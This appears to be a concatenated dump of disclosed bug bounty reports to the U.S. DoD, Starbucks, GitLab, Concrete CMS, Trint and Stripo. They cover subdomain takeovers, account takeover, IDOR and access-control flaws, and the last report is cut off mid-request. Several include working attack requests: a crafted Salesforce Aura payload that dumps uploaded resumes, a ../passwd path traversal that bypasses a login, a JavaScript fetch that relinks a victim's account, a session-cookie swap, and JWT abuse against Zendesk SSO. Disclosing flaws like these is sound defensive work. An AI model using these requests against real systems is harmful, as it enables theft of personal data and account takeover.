+host unwanted/malicious content under your domain
+receive email on subdomains mentioned above
+effectively execute cross-site scripting attacks
+in some cases, steal cookie data
+in some cases, trick password managers into filling passwords
+System Host(s)
+██████████.mil
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+See the DIG output:
+Code 632 Bytes
+1√ martinvw@denali:~/src > dig █████.mil
+2
+3; <<>> DiG 9.10.6 <<>> ████.mil
+4;; global options: +cmd
+5;; Got answer:
+6;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 44977
+7;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1
+8
+9;; OPT PSEUDOSECTION:
+10; EDNS: version: 0, flags:; udp: 512
+11;; QUESTION SECTION:
+12;█████████.mil.			IN	A
+13
+14;; ANSWER SECTION:
+15██████████.mil.		3600	IN	CNAME	peosol-lg.███.
+16
+17;; AUTHORITY SECTION:
+18us.			900	IN	SOA	a.cctld.us. admin.tldns.godaddy. 1715345748 1800 300 604800 1800
+19
+20;; Query time: 166 msec
+21;; SERVER: 8.8.8.8#53(8.8.8.8)
+22;; WHEN: Fri May 10 15:06:32 CEST 2024
+23;; MSG SIZE  rcvd: 148
+And the GoDaddy page: https://www.godaddy.com/nl-nl/domainsearch/find?domainToCheck=███
+And whois:
+Code 1.71 KiB
+1√ martinvw@denali:~/src > whois ████████.
+2% IANA WHOIS server
+3% for more information on IANA, visit http://www.iana.org
+4% This query returned 1 object
+5
+6refer:        whois.nic.us
+7
+8domain:       US
+9
+10organisation: Registry Services, LLC
+11address:      100 S. Mill Ave, Suite 1600
+12address:      Tempe AZ 85281
+13address:      United States of America (the)
+14
+15contact:      administrative
+16name:         IANA Contact
+17organisation: Registry Services, LLC
+18address:      100 S. Mill Ave, Suite 1600
+19address:      Tempe AZ 85281
+20address:      United States of America (the)
+21phone:        +1 480 505 8800
+22fax-no:       +1 480 393 4275
+23e-mail:       iana@about.us
+24
+25contact:      technical
+26name:         IANA Contact
+27organisation: Registry Services, LLC
+28address:      100 S. Mill Ave, Suite 1600
+29address:      Tempe AZ 85281
+30address:      United States of America (the)
+31phone:        +1 480 505 8800
+32fax-no:       +1 480 393 4275
+33e-mail:       iana@about.us
+34
+35nserver:      B.CCTLD.US 156.154.125.70 2001:502:ad09:0:0:0:0:29
+36nserver:      F.CCTLD.US 2001:500:3682:0:0:0:0:11 209.173.58.70
+37nserver:      K.CCTLD.US 156.154.128.70 2001:503:e239:0:0:0:3:1
+38nserver:      W.CCTLD.US 2001:dcd:1:0:0:0:0:15 37.209.192.15
+39nserver:      X.CCTLD.US 2001:dcd:2:0:0:0:0:15 37.209.194.15
+40nserver:      Y.CCTLD.US 2001:dcd:3:0:0:0:0:15 37.209.196.15
+41ds-rdata:     59017 8 2 7daf469d42b5d8e5537fd4dd4b6057710e9a61f72c32eb7fb6526f52277ec2b0
+42
+43whois:        whois.nic.us
+44
+45status:       ACTIVE
+46remarks:      Registration information: http://www.nic.us
+47
+48created:      1985-02-15
+49changed:      2024-04-16
+50source:       IANA
+51
+52# whois.nic.us
+53
+54No Data Found
+55URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
+56>>> Last update of WHOIS database: 2024-05-10T13:10:37Z <<<
+Suggested Mitigation/Remediation Actions
+Remove CNAME record █████████.mil
+
+
+
+==================================================
+
+Report File: 2586616.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Improper Authentication - Generic
+
+Contents:
+
+Hii Triager,
+I found that an attacker can change their email address to the victim's(existing user) email and restrict the victim from accessing their account.
+Vulnerable Domain: www.██████████.mil
+User-A: Attacker
+User-B: Victim
+Both User-A & User-B are registered user & have their separate accounts on www.███.mil
+Step To Reproduce
+1 - Login to Attacker's account, User-A (attacker@email.com)
+2 - Login to Victim's Account, User-B (victim@email.com)
+3 - In the Attacker's account, Navigate to Update Profile section.
+4- Change the Attacker's email to victim@email.com. You can successfully takeover the victim email. (not victim account)
+5 - Now, Try to login as victim account(with victim email & password) , Application will Return Invalid Credentials
+References
+████
+Impact
+1 -Restric any user from accessing their account.
+2 - Improper Authentication on change email fuctionality.
+System Host(s)
+www.██████.mil
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+1 - Login to Attacker's account, User-A (attacker@email.com)
+2 - Login to Victim's Account, User-B (victim@email.com)
+3 - In the Attacker's account, Navigate to Update Profile section.
+4- Change the Attacker's email to victim@email.com. You can successfully takeover the victim email. (not victim account)
+5 - Now, Try to login as victim account(with victim email & password) , Application will Return Invalid Credentials
+Suggested Mitigation/Remediation Actions
+1 - Set proper authentication on the Update Profile functionality
+
+
+
+==================================================
+
+Report File: 2623715.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Greetings DoD team,
+I located a major example of sensitive data exposure through a BAC/incorrectly configured Salesforce instance.
+The https://█████████.experience.███/s/registration page allows the attacker to download any attachment (including thousands of resumes full of PII, university transcripts, and other sensitive files) submitted by other users through the Registration form. Potentially this might also affect files added by the ███████ team manually.
+At least several files are available (possibly many more); no authentication is required for this attack.
+Impact
+Large-scale data breach/candidate PII leak.
+System Host(s)
+███████
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+Steps to reproduce:
+In browser, navigate to: https://███████.experience.██████/s/registration
+Within Burp, find any POST request to the /aura endpoint, such as below. Send to Repeater:
+Code 2.37 KiB
+1POST /s/sfsites/aura?r=1&aura.ApexAction.execute=1 HTTP/1.1
+2Host: ███████.experience.██████████
+3Cookie: ████████; BrowserId=ztAOY0pSEe-h9wmd5-lRkA; pctrk=ccfad8a9-dcf3-4ab7-9a5f-f623cdbcd7b7
+4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+5Accept: */*
+6Accept-Language: en-US,en;q=0.5
+7Accept-Encoding: gzip, deflate, br
+8Referer: https://████.experience.███████/s/registration
+9X-Sfdc-Lds-Endpoints: ApexActionController.execute:RegistrationCtrl.getFileUploadRecord
+10X-Sfdc-Page-Scope-Id: 8f4f7425-7484-4329-b975-98c3bb386cfb
+11X-Sfdc-Request-Id: 326100000096dd5c96
+12X-Sfdc-Page-Cache: eec50ac11c34f2f4
+13Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+14Content-Length: 1555
+15Origin: https://███.experience.████
+16Dnt: 1
+17Sec-Gpc: 1
+18Sec-Fetch-Dest: empty
+19Sec-Fetch-Mode: cors
+20Sec-Fetch-Site: same-origin
+21Te: trailers
+22Connection: close
+23
+24message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2298%3Ba%22%2C%22descriptor%22%3A%22aura%3A%2F%2FApexActionController%2FACTION%24execute%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%22namespace%22%3A%22%22%2C%22classname%22%3A%22RegistrationCtrl%22%2C%22method%22%3A%22getFileUploadRecord%22%2C%22cacheable%22%3Afalse%2C%22isContinuation%22%3Afalse%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22WFIwUmVJdmtIRnI3MTFpX0d6c1VwQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null
+Modify the request as follows. This is a specifically crafted Aura payload that returns 2000 ContentDocument records (uploaded files). Send to Repeater and issue request:
+Code 2.37 KiB
+1POST /s/sfsites/aura?r=1&aura.ApexAction.execute=1 HTTP/1.1
+2Host: ███████.experience.██████
+3Cookie: ██████; BrowserId=ztAOY0pSEe-h9wmd5-lRkA; pctrk=ccfad8a9-dcf3-4ab7-9a5f-f623cdbcd7b7
+4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+5Accept: */*
+6Accept-Language: en-US,en;q=0.5
+7Accept-Encoding: gzip, deflate, br
+8Referer: https://██████.experience.███/s/registration
+9X-Sfdc-Lds-Endpoints: ApexActionController.execute:RegistrationCtrl.getFileUploadRecord
+10X-Sfdc-Page-Scope-Id: 8f4f7425-7484-4329-b975-98c3bb386cfb
+11X-Sfdc-Request-Id: 326100000096dd5c96
+12X-Sfdc-Page-Cache: eec50ac11c34f2f4
+13Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+14Content-Length: 1554
+15Origin: https://██████.experience.██████████
+16Dnt: 1
+17Sec-Gpc: 1
+18Sec-Fetch-Dest: empty
+19Sec-Fetch-Mode: cors
+20Sec-Fetch-Site: same-origin
+21Te: trailers
+22Connection: close
+23
+24message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"ContentDocument","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22WFIwUmVJdmtIRnI3MTFpX0d6c1VwQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null
+Extract one of the IDs from the server response, e.g. 069830000028KJdAAM
+██████████
+Insert this ID into URL as below. This will download the attachment (confidential candidate resume) directly. All other files can be accessed using the same method.
+https://██████████.experience.██████/sfsites/c/sfc/servlet.shepherd/document/download/069830000028KJdAAM
+Hope you find this report helpful - look forward to your feedback.
+Suggested Mitigation/Remediation Actions
+
+
+
+==================================================
+
+Report File: 265284.json
+------------------------------
+Report To: Concrete CMS
+Severity: HIGH
+Weaknesses:
+- Insecure Direct Object Reference (IDOR)
+
+Contents:
+
+Installation Information
+IIS 8, PHP 5.5, Concrete5 (5.7.5.7) [Default install]
+### Issue POC
+An unauthenticated user can enumerate comments from all blog posts by POSTing requests to /index.php/tools/required/conversations/view_ajax with incremental 'cnvID' integers.
+<image_0>
+<image_1>
+<image_2>
+<image_3>
+Remediation
+Preventing insecure direct object references requires selecting an approach for protecting each user accessible object (e.g., object number, filename):
+Use per user or session indirect object references. This prevents attackers from directly targeting unauthorized resources. For example, instead of using the resource’s database key, a drop down list of six resources authorized for the current user could use the numbers 1 to 6 to indicate which value the user selected. The application has to map the per-user indirect reference back to the actual database key on the server. OWASP’s ESAPI includes both sequential and random access reference maps that developers can use to eliminate direct object references.
+Check access. Each use of a direct object reference from an untrusted source must include an access control check to ensure the user is authorized for the requested object.
+References
+OWASP Top 10 2010-A4-Insecure Direct Object References
+Also, crayons
+
+
+
+==================================================
+
+Report File: 275714.json
+------------------------------
+Report To: Starbucks
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Hi team,
+Summary:
+Subdomain developer.openapi.starbucks.com is vulnerable to subdomain takeover via Mashery service. The reason why it's worked unfortunately not fully clear to me.
+Details:
+<image_0>
+<image_1>
+PoC:
+I added simple js code to the Welcome page alert(document.domain) for this proof-of-concept.
+To confirm it just click this link http://developer.openapi.starbucks.com/
+Impact:
+As I can serve my own content without any restrictions, with this webpage I can set up a campaign to steal user cookie sessions, or use it to steal credentials, or for phishing purposes.
+Please let me know, if you need more information!
+Thanks,
+Danil
+
+
+
+==================================================
+
+Report File: 383564.json
+------------------------------
+Report To: Starbucks
+Severity: HIGH
+Weaknesses:
+- Privilege Escalation
+
+Contents:
+
+Hello,
+This is fairly close to this report however these are different subdomains than the one in the report.
+This can be pretty serious since I can server virtually anything I want. In the 45 minutes I've held the domain I have served to 341 unique IP addresses.
+Two starbucks.com subdomains are pointed to Azure with an unclaimed CNAME record. Anyone would be able to serve content on these subdomains.
+svcgatewayloadus.starbucks.com
+Code 482 Bytes
+1;; Server: 1.1.1.1:53
+2;; Size: 191
+3;; Unix time: 1531965036
+4;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 3697
+5;; flags: qr rd ra ; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+6
+7;; QUESTION SECTION:
+8svcgatewayloadus.starbucks.com. IN A
+9
+10;; ANSWER SECTION:
+11svcgatewayloadus.starbucks.com. 600 IN CNAME s00197tmp0crdfulload0.trafficmanager.net.
+12
+13;; AUTHORITY SECTION:
+14trafficmanager.net. 30 IN SOA tm1.msft.net. hostmaster.trafficmanager.net. 2003080800 900 300 2419200 30
+15
+svcgatewaydevus.starbucks.com
+Code 742 Bytes
+1;; Server: 9.9.9.9:53
+2;; Size: 156
+3;; Unix time: 1531965036
+4;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 47788
+5;; flags: qr rd ra ; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
+6
+7;; QUESTION SECTION:
+8svcgatewaydevus.starbucks.com. IN A                                                                                                                                                            
+9
+10;; ANSWER SECTION:
+11svcgatewaydevus.starbucks.com. 600 IN CNAME s00197tmp0crdfuldev0.trafficmanager.net.                                                                                                           
+12
+13;; AUTHORITY SECTION:
+14trafficmanager.net. 30 IN SOA tm1.msft.net. hostmaster.trafficmanager.net. 2003080800 900 300 2419200 30
+PoC:
+http://svcgatewayloadus.starbucks.com/
+http://svcgatewaydevus.starbucks.com/
+Mitigation:
+Remove the CNAME record from the starbucks.com DNS zone
+Claim it in Azure once I release it
+Impact
+Subdomain takeover can be used for several purposes:
+Malware
+Phishing / Spear phishing
+XSS
+Authentication bypass
+
+
+
+==================================================
+
+Report File: 428757.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Authentication Bypass Using an Alternate Path or Channel
+
+Contents:
+
+NOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!
+Summary: [add summary of the vulnerability]
+I'm able to take over the admin panel, allowing me to viewing the entire ticket database's PII (DOD ID, email, name by changing the URL and bypassing authentication
+Description: [add more details about this vulnerability]
+Steps To Reproduce:
+1: Go to
+████████?x-app=itsm&x-urlpath=/arsys/shared/login.jsp&x-redir=%2Farsys%2Fforms%2Fedgelb-itsm-ar%2FRKM%253AKnowledgeArticleManager%2FDisplay%2BView%2F%3Feid%3DKBA000000024701%26cacheid%3Ddf8e1567
+2: Change URL to
+█████?x-app=itsm&x-urlpath=../../../../../../../../passwd
+3)
+LFI fails, click login
+4) Enjoy full admin panel access
+5 (Leak PII)
+In the left hand corner, applications -> quick links -> AR system report console
+Bottom left, click run
+Supporting Material/References:
+List any additional material (e.g. screenshots, logs, etc.) Proof of PII: ██████████
+Proof of admin panel:
+█████████
+Impact
+I can steal users DOD IDs, pretty much anything I want because I'm the websites admin
+Change tickets
+Change user info
+Change permission
+Steal PII
+
+
+
+==================================================
+
+Report File: 493324.json
+------------------------------
+Report To: GitLab
+Severity: HIGH
+Weaknesses:
+- Privilege Escalation
+
+Contents:
+
+Summary:
+Hey team,
+I have discovered a way for any logged in user (attacker) to escalate his privileges to gitlab administrator if the real gitlab administrator impersonates attacker's account.
+Description:
+When the gitlab admin impersonates some user, he gets new _gitlab_session cookie and then clicking at Stop impersonating he gets his own admin's cookie back. The vulnerability is that the impersonated user (attacker in our case) can see impersonated session at the Active sessions so he can switch to it (manually setting it in cookie) and click Stop impersonating by himself. This is a way how he can become gitlab administrator.
+Steps To Reproduce:
+Sign into gitlab app as some user (attacker)
+Go to the active sessions settings tab and revoke all the sessions besides the current active one
+Sign into gitlab app in other browser as administrator (admin)
+Go to users admin section and impersonate attacker user
+<image_0>
+Inspect the Revoke button and make sure you see the session ID there. Copy it. ████
+Go to index page of gitlab as attacker (http://gitlab.bb/ in my case), I do not know why, but it is important step
+Clear attacker browser's cookie
+Open the developer console as attacker and manually set _gitlab_session to the copied one with:
+Code 42 Bytes
+1document.cookie = "_gitlab_session=█████";
+<image_1>
+Click Stop impersonating at the top-right corner as attacker and make sure you are now logged in as gitlab admin. ███
+Impact
+Every gitlab authenticated user can escalate his privileges to admin ones and give complete access to all gitlab services, projects and abilities. Only he needs to do is ask admin to impersonate his account because of something works bad there.
+
+
+
+==================================================
+
+Report File: 502593.json
+------------------------------
+Report To: GitLab
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Summary: [add summary of the vulnerability]
+Description: [add more details about this vulnerability]
+Steps To Reproduce:
+To reproduce this vulnerability, we need two accounts, lets say those accounts are:
+-> victim@gmail.com
+-> attacker@gmail.com
+<image_0>
+<image_1>
+<image_2>
+As you can see, the message of the commit, team members who commented, what the comment was, everything is visible from the email received. This shouldn't be sent via email because the settings selected for repository is 'Only Team Members' whereas attacker@gmail.com is not a team member.
+I have tried my best to have perfect steps to reproduce this, still do tell me if you need more info :)
+Thanks,
+Yash :)
+Impact
+An attacker will be able to view any commit titles, and all comments which shouldn't be visible to him using this vulnerability
+
+
+
+==================================================
+
+Report File: 674195.json
+------------------------------
+Report To: GitLab
+Severity: HIGH
+Weaknesses:
+- Insecure Direct Object Reference (IDOR)
+
+Contents:
+
+Summary
+An attacker can link her own customers.gitlab.com account to the one of the victim, and these give access to 3 different vulnerabilities:
+destroying subscriptions of the victim
+buying new subscriptions using victim credit card for its own groups
+some (minor) information disclosure about what is over Gitlab.com
+Steps to reproduce
+The attacker registers herself on customers.gitlab.com, logging in using her Gitlab.com account.
+After that, she updates her customers.gitlab.com account and link it to the victim's Gitlab account through the victim's account userId (they are sequential and they are not secret, so no problem retrieving it).
+This update is quite easy, attacker needs only to copy how "Update Account" HTTP request, and change the customer%5Buid%5D field, like this:
+Code 743 Bytes
+1await fetch("https://customers.gitlab.com/customers", {
+2    "credentials": "include",
+3    "referrer": "https://customers.gitlab.com/customers/edit",
+4    "body": "utf8=%E2%9C%93&_method=patch&authenticity_token=YOquJGc9evhkHMfLOZljuw9OcDn0gtJw8AHPb0yVhyml9q1TISGHa%2FK57DAlg8jB%2BEqvJYYob26BRgx4sZbRzg%3D%3D&customer%5Bfirst_name%5D=Riccardo&customer%5Blast_name%5D=Padovani&customer%5Baddress_1%5D=&customer%5Baddress_2%5D=&customer%5Bcity%5D=Munich&customer%5Bzip_code%5D=81479&customer%5Bcountry%5D=DEU&customer%5Bstate%5D=BY&customer%5Bvat_code%5D=&customer%5Bcompany%5D=Riccardo+Padovani&customer%5Bemail%5D=hackerone1%40rpadovani.com&customer%5Bprovider%5D=gitlab&customer%5Buid%5D=VICTIM_ID",
+5    "method": "POST",
+6    "mode": "cors"
+7});
+The backend will validate the input, and now the two accounts are somehow linked.
+Impact
+When the victim will login again, all his subscriptions will be lost
+If the victim updates his data after the attack, the attacker account will be updated with the same data, INCLUDING CREDIT CARD. The attacker can now purchase plans using victim's credit card
+Attacker has also a list of teams victim is owner, when she purchases a new plan.
+If attacker wants to purchase a plan for her own group, she can nominate victim owner, so now attacker's group will be in the dropdown, buy the plan, remove the victim.
+Examples
+I attached a video with all these attacks, sorry but it is a bit messy.
+On the left there is victim's browser, on the right attacker's browser. When it appears a console, is for the attacker's browser. The attacker's is in a private session, so it is completely separated from the victim.
+0:00-0:10: we see victim has a subscription, and attacker no. They also have different data
+0:10-0:40: attacker does a first attack, changing both uid and email, and it doesn't work
+0:40-1:10: attacker does a proper attack, changing only uid. Notice how bottom right the Gitlab.com account changes
+1:10-1:30: nothing else has changed
+1:30-1:50: victim does log out and login again and ALL DATA AND SUBSCRIPTIONS ARE GONE
+You can skip to
+2:30-2:40: victim updates his data, also attacker's data are updated accordingly
+2:40-4:30: victim buys a new subscription
+4:30-5:00: attackers can use victim's credit card
+What is the current bug behavior?
+customers.gitlab.com user can update its link to Gitlab.com without any verification
+End notes:
+I'd like you also reset my customers.gitlab.com accounts, now they are all a bit a mess.
+Also, while testing I think I associated my customers.gitlab.com account with Gitlab's account with UID 1 due an error in copy-paste. I removed immediately the link, but maybe you should check if the link is indeed being delete, and say sorry on my behalf to Sid!
+I noticed that in the video it appears my CC data - so please do not disclose the issue, also on the Gitlab.com issue tracker, without removing the video first, please!
+Impact
+Attackers can steal victim's data, including last 4 numbers of CC, and use victim's CC to buy subscriptions
+
+
+
+==================================================
+
+Report File: 683024.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Summary:
+The endpoint at https://███████/ui/core/index.html required authentication, but navigating to https://█████/ui/core/index.html?mode=public#expl-tabl./SHARED/rpchllmd/CSAT allow for read/write access.
+Description:
+The endpoint at https://████/ui/core/index.html?mode=public#expl-tabl./SHARED/rpchllmd/CSAT allowed for read as well as write access. It was possible to create directories and upload images as well as .exe files such as putty.exe.
+Impact
+An attacker can attempt to use the site to host malware, or perform social engineering attacks since the domain URL will be a .mil address.
+Step-by-step Reproduction Instructions
+Navigate to: https://████/ui/core/index.html?mode=public#expl-tabl./SHARED/rpchllmd/CSAT
+Create sub-directory
+Upload test files
+Files are then uploaded and hosted on a .mil website without authenticating to the application.
+Product, Version, and Configuration (If applicable)
+FileCloud software
+https://www.getfilecloud.com/
+## Suggested Mitigation/Remediation Actions
+Enforce authentication on endpoints of the application, restrict file uploads to only necessary business requirements. If possible restrict uploads to .jpg .pfd .docx. Don't allowed upload of executable files
+Impact
+An attacker can attempt to use the site to host malware, or perform social engineering attacks since the domain URL will be a .mil address.
+
+
+
+==================================================
+
+Report File: 734936.json
+------------------------------
+Report To: Trint Ltd
+Severity: HIGH
+Weaknesses:
+- Improper Authentication - Generic
+
+Contents:
+
+Summary
+hello there because in app.trint.com there's no email verification i able to login in your zendesk SSO using your organization
+your organization using domain *@trint.com because there's no email verification i able to read and takeover + claim this email
+support+1@trint.com and i able to login in zendesk SSO using that email.
+How to reproduce
+i registered in app.trint.com using this email support+1@trint.com until registration step finish
+i check my burp history there's a graphql request in this host https://graphql2.trint.com/
+i use this query
+Code 1.09 KiB
+1POST / HTTP/1.1
+2Host: graphql2.trint.com
+3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
+4Accept: */*
+5Accept-Language: en-US,en;q=0.5
+6Accept-Encoding: gzip, deflate
+7Referer: https://app.trint.com/
+8content-type: application/json
+9Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWRjOTUwZWEzOGFhMjI3MmExNzAyMzFkIiwiaHR0cHM6Ly9hcHAudHJpbnQuY29tL2lzTmV3VXNlciI6dHJ1ZSwiaHR0cHM6Ly9zY2hlbWEudHJpbnQuY29tL2F1dGhqdGkiOiI0ZmMwMjUyZS03NTFiLTQwNjctOWU0MC00OGQ4MWMzMjRiMjIiLCJpc3MiOiJodHRwczovL3RyaW50LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZGM5NTBlYTM4YWEyMjcyYTE3MDIzMWQiLCJhdWQiOiJ0cmludC1hcGlzIiwiaWF0IjoxNTczNDc0NTQyLCJleHAiOjE1NzYwNjY1NDIsImF6cCI6ImljaDRoeVZZUEtLZ2VFb1RoNmZXUFhjNmZydmVUY1RxIiwiZ3R5IjoicGFzc3dvcmQifQ.JyIc6PZyjidptrvaFT6MykOr0BopUi1F7fZWTvbeKeU
+10X-Trint-Request-Id: 4b2f23d5-98a3-4571-a9e1-4218cca76e1b
+11X-Trint-Super-Properties: {}
+12Origin: https://app.trint.com
+13Content-Length: 111
+14Connection: close
+15
+16{"operationName":null,"variables":{"status":"PENDING"},"query":"query zendeskToken {\n    zendeskToken\n  }\n"}
+HTTP/1.1 200 OK
+
+{"data":{"zendeskToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM"}}
+Code 527 Bytes
+1
+2* i crafted this url `https://trintsupport.zendesk.com/access/jwt?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM`
+3
+4* boom logged in in ticket using email `support+1@trint.com`
+5
+6#POC
+7
+8{F631462}
+9
+10## Impact
+11
+12#Impact
+13* i can read your ticket organization request through `https://support.trint.com/hc/en-us/requests/organization`
+
+
+
+==================================================
+
+Report File: 751299.json
+------------------------------
+Report To: Stripo Inc
+Severity: HIGH
+Weaknesses:
+- Improper Authorization
+
+Contents:
+
+hi there ,
+i found an vulnerability on https://my.stripo.email/cabinet/#/users/orog_id ,
+generally every user have an organisation and the organisation contain projects ,
+lets suppose : test@gmail.com is the owner of the project
+and test2@gmail.com was invited to his project as admin , in normal situation the owner can not be removed even if second account is admin
+the issue is i can removed the owned from hi position to admin , and the big problem once the owner is removed he can not login again to his account
+Steps To Reproduce:
+[add details for how we can reproduce the issue]
+you must have 2 account , one owner , the second got invited as admin
+log in with your second account and go to https://my.stripo.email/cabinet/#/users/xxxx
+you will see that the input of role is disabled , enable it via inspect element ( f12) ,
+then change the role of owner for it to admin , an PUT request will be sent
+http request
+PUT /cabinet/stripeapi/v1/organizations/135428/users HTTP/1.1
+Host: my.stripo.email
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: application/json, text/plain, /
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Bearer null
+Content-Type: application/json;charset=UTF-8
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: Sat, 01 Jan 2000 00:00:00 GMT
+Content-Length: 231
+Origin: https://my.stripo.email
+Connection: close
+Referer: https://my.stripo.email/cabinet/
